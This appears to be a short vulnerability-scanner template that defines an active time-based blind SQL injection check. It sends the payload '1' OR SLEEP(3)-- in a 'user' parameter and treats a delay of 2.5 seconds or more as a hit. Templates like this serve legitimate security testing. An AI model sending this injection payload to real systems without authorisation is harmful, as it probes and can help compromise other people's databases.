id: sqli-time3-522
name: 'Delay probe in user'
severity: high
type: active
tags:
  - sqli
  - injection
  - blind
  - time
description: '3-second delay via user'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      user:
        - '1'' OR SLEEP(3)--'
    matchers:
      - type: time
        ms: 2500
